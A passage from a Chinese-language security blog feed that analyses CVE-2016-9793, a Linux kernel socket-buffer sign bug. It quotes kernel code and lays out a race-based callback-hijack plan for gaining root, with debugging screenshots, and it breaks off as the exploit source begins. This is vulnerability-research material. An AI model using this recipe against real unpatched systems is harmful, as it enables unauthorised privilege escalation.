    
  </entry>
  
  <entry>
    <title>CVE-2016-9793分析</title>
    <link href="http://phot0n.com/2023/04/19/CVE-2016-9793%E5%88%86%E6%9E%90/"/>
    <id>http://phot0n.com/2023/04/19/CVE-2016-9793%E5%88%86%E6%9E%90/</id>
    <published>2023-04-19T08:27:13.000Z</published>
    <updated>2023-08-08T16:48:35.820Z</updated>
    
    <content type="html"><![CDATA[<p>读一篇关于iot固件外设移植的paper时看到了有关该漏洞的描述，于是简要地看了一下，再此做一下记录</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>在<code>net/core/sock.c</code>中，函数<code>sock_setsockopt</code>使用了错误的类型进行赋值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sock_setsockopt</span><span class="params">(struct socket *sock, <span class="keyword">int</span> level, <span class="keyword">int</span> optname,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">char</span> __user *optval, <span class="keyword">unsigned</span> <span class="keyword">int</span> optlen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">sock</span>-&gt;<span class="title">sk</span>;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">if</span> (get_user(val, (<span class="keyword">int</span> __user *)optval))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">    ....</span><br><span class="line">    <span class="keyword">switch</span> (optname) &#123;</span><br><span class="line">    ....</span><br><span class="line"><span class="keyword">case</span> SO_SNDBUF:</span><br><span class="line"><span class="comment">/* Don&#x27;t error on this BSD doesn&#x27;t and if you think</span></span><br><span class="line"><span class="comment"> * about it this is right. Otherwise apps have to</span></span><br><span class="line"><span class="comment"> * play &#x27;guess the biggest size&#x27; games. RCVBUF/SNDBUF</span></span><br><span class="line"><span class="comment"> * are treated in BSD as hints</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">val = <span class="keyword">min_t</span>(u32, val, sysctl_wmem_max);</span><br><span class="line">set_sndbuf:</span><br><span class="line">sk-&gt;sk_userlocks |= SOCK_SNDBUF_LOCK;</span><br><span class="line">sk-&gt;sk_sndbuf = <span class="keyword">max_t</span>(u32, val * <span class="number">2</span>, SOCK_MIN_SNDBUF);</span><br><span class="line"><span class="comment">/* Wake up sending tasks if we upped the value. */</span></span><br><span class="line">sk-&gt;sk_write_space(sk);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> SO_SNDBUFFORCE:</span><br><span class="line"><span class="keyword">if</span> (!capable(CAP_NET_ADMIN)) &#123;</span><br><span class="line">ret = -EPERM;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">goto</span> set_sndbuf;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>max_t</code>宏定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max_t(type, x, y) (&#123;\</span></span><br><span class="line">type __max1 = (x);\</span><br><span class="line">type __max2 = (y);\</span><br><span class="line">__max1 &gt; __max2 ? __max1: __max2; &#125;)</span><br></pre></td></tr></table></figure><p>而<code>sk-&gt;sk_sndbuf</code>却是<code>int</code>类型。造成了<code>max_t(u32,-1,SOCK_MIN_RCVBUF)</code>返回的是-1，然后错误地赋给了<code>sk-&gt;sk_sndbuf</code> 。需要注意的是，这里需要走<code>SO_SNDBUFFORCE</code>这个分支，如果走<code>SO_SNDBUF</code>分支的话<code>val</code>会被赋值，可能不会取传来的值。</p><h2 id="调用链与劫持思路"><a href="#调用链与劫持思路" class="headerlink" title="调用链与劫持思路"></a>调用链与劫持思路</h2><h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p>write系统调用对socket进行写的时候会走如下调用链</p><p>Sys_write -&gt; vfs_write() -&gt; __vfs_write() -&gt; sock_write_iter() -&gt; sock_sendmsg() -&gt; unix_stream_sendmsg() -&gt; sock_alloc_send_pskb() -&gt; alloc_skb_with_frags() -&gt; alloc_skb() -&gt; __alloc_skb()</p><p>其细节如下,首先是<code>unix_stream_sendmsg</code>时，其中有个循环，会将<code>size</code>赋值为<code>(sk-&gt;sk_sndbuf &gt;&gt; 1) - 64</code>(因为size必定大于0，而后者可控，可以赋小于零，后一个<code>min_t</code>同理)最终会把<code>sk-&gt;sk_sndbuf</code>相关值赋给<code>data_len</code> ,然后调用<code>sock_alloc_send_skb</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">unix_stream_sendmsg</span><span class="params">(struct socket *sock, struct msghdr *msg,</span></span></span><br><span class="line"><span class="function"><span class="params">       <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">sock</span>-&gt;<span class="title">sk</span>;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">while</span> (sent &lt; len) &#123;</span><br><span class="line">size = len - sent;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Keep two messages in the pipe so it schedules better */</span></span><br><span class="line">size = <span class="keyword">min_t</span>(<span class="keyword">int</span>, size, (sk-&gt;sk_sndbuf &gt;&gt; <span class="number">1</span>) - <span class="number">64</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* allow fallback to order-0 allocations */</span></span><br><span class="line">size = <span class="keyword">min_t</span>(<span class="keyword">int</span>, size, SKB_MAX_HEAD(<span class="number">0</span>) + UNIX_SKB_FRAGS_SZ);</span><br><span class="line"></span><br><span class="line">data_len = <span class="keyword">max_t</span>(<span class="keyword">int</span>, <span class="number">0</span>, size - SKB_MAX_HEAD(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">data_len = <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, size, PAGE_ALIGN(data_len));</span><br><span class="line"></span><br><span class="line">skb = sock_alloc_send_pskb(sk, size - data_len, data_len,</span><br><span class="line">   msg-&gt;msg_flags &amp; MSG_DONTWAIT, &amp;err,</span><br><span class="line">   get_order(UNIX_SKB_FRAGS_SZ));</span><br><span class="line">        ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>而在<code>sock_alloc_send_pskb</code>中,对参数<code>header_len</code>以及<code>data_len</code>（分别对应上层调用时传进的<code>size - data_len</code>以及<code>data_len</code>没有作修改，调用了<code>alloc_skb_with_frags</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct sk_buff *<span class="title">sock_alloc_send_pskb</span><span class="params">(struct sock *sk, <span class="keyword">unsigned</span> <span class="keyword">long</span> header_len,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">unsigned</span> <span class="keyword">long</span> data_len, <span class="keyword">int</span> noblock,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">int</span> *errcode, <span class="keyword">int</span> max_page_order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line"><span class="keyword">long</span> timeo;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">timeo = sock_sndtimeo(sk, noblock);</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">err = sock_error(sk);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> failure;</span><br><span class="line"></span><br><span class="line">err = -EPIPE;</span><br><span class="line"><span class="keyword">if</span> (sk-&gt;sk_shutdown &amp; SEND_SHUTDOWN)</span><br><span class="line"><span class="keyword">goto</span> failure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sk_wmem_alloc_get(sk) &lt; sk-&gt;sk_sndbuf)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">set_bit(SOCK_ASYNC_NOSPACE, &amp;sk-&gt;sk_socket-&gt;flags);</span><br><span class="line">set_bit(SOCK_NOSPACE, &amp;sk-&gt;sk_socket-&gt;flags);</span><br><span class="line">err = -EAGAIN;</span><br><span class="line"><span class="keyword">if</span> (!timeo)</span><br><span class="line"><span class="keyword">goto</span> failure;</span><br><span class="line"><span class="keyword">if</span> (signal_pending(current))</span><br><span class="line"><span class="keyword">goto</span> interrupted;</span><br><span class="line">timeo = sock_wait_for_wmem(sk, timeo);</span><br><span class="line">&#125;</span><br><span class="line">skb = alloc_skb_with_frags(header_len, data_len, max_page_order,</span><br><span class="line">   errcode, sk-&gt;sk_allocation);</span><br><span class="line"><span class="keyword">if</span> (skb)</span><br><span class="line">skb_set_owner_w(skb, sk);</span><br><span class="line"><span class="keyword">return</span> skb;</span><br><span class="line"></span><br><span class="line">interrupted:</span><br><span class="line">err = sock_intr_errno(timeo);</span><br><span class="line">failure:</span><br><span class="line">*errcode = err;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在<code>alloc_skb_with_frags</code>函数中，会调用<code>alloc_skb</code>进行<code>sk_buff</code>结构体的分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct sk_buff *<span class="title">alloc_skb_with_frags</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> header_len,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">unsigned</span> <span class="keyword">long</span> data_len,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">int</span> max_page_order,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">int</span> *errcode,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">gfp_t</span> gfp_mask)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">...</span><br><span class="line">skb = alloc_skb(header_len, gfp_head);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>alloc_skb</code>函数实际上是<code>__alloc_skb</code>的一个简单封装</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *__<span class="title">alloc_skb</span>(<span class="title">unsigned</span> <span class="title">int</span> <span class="title">size</span>, <span class="title">gfp_t</span> <span class="title">priority</span>, <span class="title">int</span> <span class="title">flags</span>,</span></span><br><span class="line"><span class="class">    <span class="title">int</span> <span class="title">node</span>);</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct sk_buff *<span class="title">alloc_skb</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">gfp_t</span> priority)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> __alloc_skb(size, priority, <span class="number">0</span>, NUMA_NO_NODE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终会调用<code>__alloc_skb</code>，分配一个<code>sk_buff</code>结构体，并且对其一些成员(比如<code>head</code>,<code>data</code>,<code>end</code>等)进行初始化。与我们传入的<code>sk_sndbuf</code>有关的就是进行对齐，然后加上<code>skb-&gt;tail</code>,赋值给<code>skb-&gt;end</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *__<span class="title">alloc_skb</span>(<span class="title">unsigned</span> <span class="title">int</span> <span class="title">size</span>, <span class="title">gfp_t</span> <span class="title">gfp_mask</span>,</span></span><br><span class="line"><span class="class">    <span class="title">int</span> <span class="title">flags</span>, <span class="title">int</span> <span class="title">node</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">cache</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info</span> *<span class="title">shinfo</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">u8 *data;</span><br><span class="line"><span class="keyword">bool</span> pfmemalloc;</span><br><span class="line">....</span><br><span class="line"><span class="comment">/* Get the HEAD */</span></span><br><span class="line">skb = kmem_cache_alloc_node(cache, gfp_mask &amp; ~__GFP_DMA, node);</span><br><span class="line"><span class="keyword">if</span> (!skb)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">....</span><br><span class="line">size = SKB_DATA_ALIGN(size);</span><br><span class="line">size += SKB_DATA_ALIGN(<span class="keyword">sizeof</span>(struct skb_shared_info));</span><br><span class="line">    ....</span><br><span class="line"><span class="built_in">memset</span>(skb, <span class="number">0</span>, offsetof(struct sk_buff, tail));</span><br><span class="line"><span class="comment">/* Account for allocated memory : skb + skb-&gt;head */</span></span><br><span class="line">skb-&gt;truesize = SKB_TRUESIZE(size);</span><br><span class="line">skb-&gt;pfmemalloc = pfmemalloc;</span><br><span class="line">atomic_set(&amp;skb-&gt;users, <span class="number">1</span>);</span><br><span class="line">skb-&gt;head = data;</span><br><span class="line">skb-&gt;data = data;</span><br><span class="line">skb_reset_tail_pointer(skb);</span><br><span class="line">skb-&gt;end = skb-&gt;tail + size;</span><br><span class="line">skb-&gt;mac_header = (typeof(skb-&gt;mac_header))~<span class="number">0U</span>;</span><br><span class="line">skb-&gt;transport_header = (typeof(skb-&gt;transport_header))~<span class="number">0U</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* make sure we initialize shinfo sequentially */</span></span><br><span class="line">shinfo = skb_shinfo(skb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="劫持思路"><a href="#劫持思路" class="headerlink" title="劫持思路"></a>劫持思路</h3><p>劫持主要用的是<code>close</code>,通过控制函数指针的方式进行控制流劫持。</p><p>close会调用<code>skb_release_data</code>函数把分配的<code>sk_buff</code>的有关内存进行释放(在高版本linux中该回调已被去除)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">skb_release_data</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info</span> *<span class="title">shinfo</span> = <span class="title">skb_shinfo</span>(<span class="title">skb</span>);</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (skb-&gt;cloned &amp;&amp;</span><br><span class="line">    atomic_sub_return(skb-&gt;nohdr ? (<span class="number">1</span> &lt;&lt; SKB_DATAREF_SHIFT) + <span class="number">1</span> : <span class="number">1</span>,</span><br><span class="line">      &amp;shinfo-&gt;dataref))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; shinfo-&gt;nr_frags; i++)</span><br><span class="line">__skb_frag_unref(&amp;shinfo-&gt;frags[i]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If skb buf is from userspace, we need to notify the caller</span></span><br><span class="line"><span class="comment"> * the lower device DMA has done;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (shinfo-&gt;tx_flags &amp; SKBTX_DEV_ZEROCOPY) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ubuf_info</span> *<span class="title">uarg</span>;</span></span><br><span class="line"></span><br><span class="line">uarg = shinfo-&gt;destructor_arg;</span><br><span class="line"><span class="keyword">if</span> (uarg-&gt;callback)</span><br><span class="line">uarg-&gt;callback(uarg, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (shinfo-&gt;frag_list)</span><br><span class="line">kfree_skb_list(shinfo-&gt;frag_list);</span><br><span class="line"></span><br><span class="line">skb_free_head(skb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中会调用<code>shinfo-&gt;destructor_arg-&gt;callback(uarg, true)</code>进行回调函数的使用</p><p>而<code>shinfo</code>是通过<code>skb_shinfo(skb)</code>得来的，将其宏展开，事实上就是获得<code>skb-&gt;head+skb-&gt;end</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> skb_shinfo(SKB)((struct skb_shared_info *)(skb_end_pointer(SKB)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> NET_SKBUFF_DATA_USES_OFFSET</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="title">skb_end_pointer</span><span class="params">(<span class="keyword">const</span> struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> skb-&gt;head + skb-&gt;end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而这些我们都是可控的。</p><p>所以我们可以通过控制<code>shinfo</code>进而指向我们布置的<code>skb_shared_info</code>结构体，构造其上的<code>destructor_arg</code>成员，指向布置好<code>callback</code>函数指针的<code>ubuf_info</code>结构体即可。</p><p>总得来说过程如下</p><ul><li>申请地址<code>0xfffffed0</code></li><li>创建线程，重复对<code>0xfffffed0</code>的<code>skb_shared_info</code>结构体进行赋值，布置好<code>callback</code>指针</li><li>建立套接字，进行发送和接收消息</li><li>调用<code>setsockopt</code>，设置<code>sk_sndbuf</code>为<code>0xfffffe00</code>(即<code>0xffffff00&lt;&lt;1</code>)</li><li>调用<code>write</code>，从而将<code>skb-&gt;end</code>设置为<code>0xfffffec0</code>，<code>skb-&gt;head</code>设置为<code>0x10</code>,得到<code>shinfo=0xfffffed0</code></li><li>通过<code>close</code>调用<code>callback</code>劫持控制流进行提权。没有开<code>kalsr</code>和<code>SMAP/SMEP</code>的情况下直接通过<code>/proc/kallsyms</code>找<code>commit_creds</code>和<code>prepare_kernel_cred</code>然后<code>ret2usr</code>即可。</li></ul><p>这里创建线程重复对<code>0xfffffed0</code>的<code>skb_shared_info</code>结构体进行赋值的原因是在进入<code>write</code>调用链时，在<code>__alloc_skb</code>中会对我们的结构体前半段进行清零(<code>skb_shared_info-&gt;destructor_arg</code>不受影响)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="built_in">memset</span>(shinfo, <span class="number">0</span>, offsetof(struct skb_shared_info, dataref));</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h1 id="漏洞利用与调试"><a href="#漏洞利用与调试" class="headerlink" title="漏洞利用与调试"></a>漏洞利用与调试</h1><p>由于没有搞源码级调试，所以就简单得加载符号然后在关键函数上面下断点</p><p>事实上调试的时候发现似乎<code>skb_release_data</code>这个函数并不是<code>close</code>调用的，我把close注释掉也能触发这个函数。而且根据gdb这个断点也不是主函数线程触发的，而是write线程。测试发现必须有<code>setsockopt(sockets[1], SOL_SOCKET, SO_SNDBUF,&amp;sndbuf, sizeof(sndbuf));</code>。gdb的BACKTRACE还炸掉了，看不到之前的一些调用链。猜测应该是使用真正的调用链应该是<code>setsockopt</code>唤醒了一个阻塞的write，然后write调用<code>kfree_skb-&gt;skb_release_all-&gt;skb_release_data</code>这样。</p><p>总的来说就三个线程:线程1(主线程)、线程2(不断地写<code>skb_shared_info-&gt;tx_flags</code>)、线程3(调用write)</p><p>有个条件竞争，我们希望在线程3调用<code>__alloc_skb</code>把<code>skb_shared_info-&gt;tx_flags</code>清零之后，线程2再把<code>skb_shared_info-&gt;tx_flags</code>写上。然后线程1调用<code>setsockopt</code>，线程3调用<code>skb_release_data</code></p><p>在这里断下来可以看到与<code>tx_flags</code>的比较操作，后面的<code>test rdi rdi</code>则是判断指针是否非空，如果非空则直接调用。这里截的是线程竞争不正确的例子(因为tx_flag没有置上)</p><p><img src="https://s2.loli.net/2023/08/09/pcRC4EsaznOqY8F.png" alt="image-20230424232217901"></p><p>而这个就是竞争成功的例子</p><p><img src="https://s2.loli.net/2023/08/09/mnKeZfNH8JugtaC.png" alt="image-20230424232904128"></p><p>成功调用用户态布置好的提权程序<code>get_root</code></p><p><img src="https://s2.loli.net/2023/08/09/aX4GjJY3izyL1oS.png" alt="image-20230424233018952"></p><p>挺随缘的，而且有时候进入了<code>getuid() == 0</code>的分支了起的shell还是普通用户的。</p><p><img src="https://s2.loli.net/2023/08/09/5vEs9THS1PAaZNo.png" alt="image-20230419230033142"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> 